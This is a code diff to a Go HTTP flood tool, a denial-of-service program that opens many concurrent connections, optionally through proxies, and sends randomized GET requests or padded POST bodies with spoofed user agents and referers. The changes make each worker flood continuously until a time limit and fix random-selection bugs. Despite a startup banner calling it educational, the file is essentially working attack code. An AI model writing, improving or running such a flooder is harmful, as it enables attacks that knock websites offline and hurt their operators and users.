@@ -73,7 +73,7 @@ var (
 		"https://www.ted.com/search?q=",
 		"https://play.google.com/store/search?q=",
 	}
-	headerFile = "header.txt" 
+	headerFile = "header.txt"
 	proxies    []string
 	payloadKB  int
 	workers    int
@@ -91,9 +91,9 @@ func init() {
 func clearTerminal() {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "cls") 
+		cmd = exec.Command("cmd", "/c", "cls")
 	} else {
-		cmd = exec.Command("clear") 
+		cmd = exec.Command("clear")
 	}
 	cmd.Stdout = os.Stdout
 	cmd.Run()
@@ -103,13 +103,13 @@ func getuseragent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
 	if platform == "Macintosh" {
-		os = choice2[rand.Intn(len(choice2)-1)]
+		os = choice2[rand.Intn(len(choice2))]
 	} else if platform == "Windows" {
-		os = choice3[rand.Intn(len(choice3)-1)]
+		os = choice3[rand.Intn(len(choice3))]
 	} else if platform == "X11" {
-		os = choice4[rand.Intn(len(choice4)-1)]
+		os = choice4[rand.Intn(len(choice4))]
 	}
-	browser := choice5[rand.Intn(len(choice5)-1)]
+	browser := choice5[rand.Intn(len(choice5))]
 	if browser == "chrome" {
 		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
 		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
@@ -120,7 +120,7 @@ func getuseragent() string {
 		option := rand.Intn(1)
 		var token string
 		if option == 1 {
-			token = choice6[rand.Intn(len(choice6)-1)] + "; "
+			token = choice6[rand.Intn(len(choice6))] + "; "
 		} else {
 			token = ""
 		}
@@ -144,122 +144,130 @@ func loadProxies(file string) ([]string, error) {
 	return proxies, nil
 }
 
-func flood(proxy string, wg *sync.WaitGroup) {
+func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
 	defer wg.Done()
 
-	addr := host + ":" + port
-	header := ""
-	if mode == "get" {
-		header += " HTTP/1.1\r\nHost: "
-		header += addr + "\r\n"
-		if headerFile == "nil" {
-			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-			header += "User-Agent: " + getuseragent() + "\r\n"
-			header += acceptall[rand.Intn(len(acceptall))]
-			header += referers[rand.Intn(len(referers))] + "\r\n"
-		} else {
-			func() {
-				fi, err := os.Open(headerFile)
-				if err != nil {
-					fmt.Printf("Error: %s\n", err)
-					return
+	for {
+		select {
+		case <-timeoutChan:
+			return
+		default:
+			addr := host + ":" + port
+			header := ""
+			if mode == "get" {
+				header += " HTTP/1.1\r\nHost: "
+				header += addr + "\r\n"
+				if headerFile == "nil" {
+					header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
+					header += "User-Agent: " + getuseragent() + "\r\n"
+					header += acceptall[rand.Intn(len(acceptall))]
+					header += referers[rand.Intn(len(referers))] + "\r\n"
+				} else {
+					func() {
+						fi, err := os.Open(headerFile)
+						if err != nil {
+							fmt.Printf("Error: %s\n", err)
+							return
+						}
+						defer fi.Close()
+						br := bufio.NewReader(fi)
+						for {
+							a, _, c := br.ReadLine()
+							if c == io.EOF {
+								break
+							}
+							header += string(a) + "\r\n"
+						}
+					}()
 				}
-				defer fi.Close()
-				br := bufio.NewReader(fi)
-				for {
-					a, _, c := br.ReadLine()
-					if c == io.EOF {
-						break
-					}
-					header += string(a) + "\r\n"
+			} else if mode == "post" {
+				data := ""
+				if headerFile != "nil" {
+					func() {
+						fi, err := os.Open(headerFile)
+						if err != nil {
+							fmt.Printf("Error: %s\n", err)
+							return
+						}
+						defer fi.Close()
+						br := bufio.NewReader(fi)
+						for {
+							a, _, c := br.ReadLine()
+							if c == io.EOF {
+								break
+							}
+							header += string(a) + "\r\n"
+						}
+					}()
+				} else {
+					data = strings.Repeat("a", payloadKB*1024)
 				}
-			}()
-		}
-	} else if mode == "post" {
-		data := ""
-		if headerFile != "nil" {
-			func() {
-				fi, err := os.Open(headerFile)
-				if err != nil {
-					fmt.Printf("Error: %s\n", err)
-					return
-				}
-				defer fi.Close()
-				br := bufio.NewReader(fi)
-				for {
-					a, _, c := br.ReadLine()
-					if c == io.EOF {
-						break
-					}
-					header += string(a) + "\r\n"
-				}
-			}()
-		} else {
-			data = strings.Repeat("a", payloadKB*1024) 
-		}
-		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
-		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
-	}
-
-	var s net.Conn
-	var err error
-	<-start
-
-	for i := 0; i < requests; i++ {
-		if proxy != "" {
-			dialer := &net.Dialer{
-				Timeout: timeout,
+				header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+				header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
+				header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 			}
-			if strings.HasPrefix(proxy, "http") {
-				proxyURL, _ := url.Parse(proxy)
-				s, err = tls.Dial("tcp", proxyURL.Host, &tls.Config{
-					InsecureSkipVerify: true,
-				})
-			} else if strings.HasPrefix(proxy, "socks4") {
-				s, err = net.DialTimeout("tcp", proxy, timeout)
-			} else if strings.HasPrefix(proxy, "socks5") {
-				s, err = net.DialTimeout("tcp", proxy, timeout)
-			}
-		} else {
-			if port == "443" {
-				cfg := &tls.Config{
-					InsecureSkipVerify: true,
-					ServerName:         host,
+
+			var s net.Conn
+			var err error
+			<-start
+
+			if proxy != "" {
+				if strings.HasPrefix(proxy, "http") {
+					proxyURL, _ := url.Parse(proxy)
+					s, err = tls.Dial("tcp", proxyURL.Host, &tls.Config{
+						InsecureSkipVerify: true,
+					})
+				} else if strings.HasPrefix(proxy, "socks4") {
+					dialer := &net.Dialer{
+						Timeout: timeout,
+					}
+					s, err = dialer.Dial("tcp", proxy)
+				} else if strings.HasPrefix(proxy, "socks5") {
+					dialer := &net.Dialer{
+						Timeout: timeout,
+					}
+					s, err = dialer.Dial("tcp", proxy)
 				}
-				s, err = tls.Dial("tcp", addr, cfg)
 			} else {
-				s, err = net.Dial("tcp", addr)
+				if port == "443" {
+					cfg := &tls.Config{
+						InsecureSkipVerify: true,
+						ServerName:         host,
+					}
+					s, err = tls.Dial("tcp", addr, cfg)
+				} else {
+					s, err = net.Dial("tcp", addr)
+				}
 			}
-		}
 
-		if err != nil {
+			if err != nil {
+				logMutex.Lock()
+				failed++
+				logMutex.Unlock()
+				continue
+			}
+
+			request := ""
+			if mode == "get" {
+				request += "GET " + page + key
+				request += strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
+			}
+			request += header + "\r\n"
+			s.Write([]byte(request))
+
 			logMutex.Lock()
-			failed++
+			success++
 			logMutex.Unlock()
-			continue
+
+			s.Close()
 		}
-
-		request := ""
-		if mode == "get" {
-			request += "GET " + page + key
-			request += strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
-		}
-		request += header + "\r\n"
-		s.Write([]byte(request))
-
-		logMutex.Lock()
-		success++
-		logMutex.Unlock()
-
-		s.Close()
 	}
 }
 
 func main() {
 	fmt.Println("\033[31mWARNING:\033[0m This tool is for educational and testing purposes only. Use it responsibly and only on systems you own or have explicit permission to test. Misuse of this tool is illegal and unethical.")
 	fmt.Println("Press [Enter] to continue...")
-	bufio.NewReader(os.Stdin).ReadBytes('\n') 
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
 
 	clearTerminal()
 
@@ -354,15 +362,17 @@ func main() {
 	page = u.Path
 
 	if strings.Contains(page, "?") {
-            key = "&"
-        } else {
-            key = "?"
-        }
+		key = "&"
+	} else {
+		key = "?"
+	}
+
+	timeoutChan := time.After(time.Duration(limit) * time.Second)
 
 	var wg sync.WaitGroup
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go flood(proxies[i%len(proxies)], &wg)
+		go flood(proxies[i%len(proxies)], &wg, timeoutChan)
 	}
 
 	close(start)
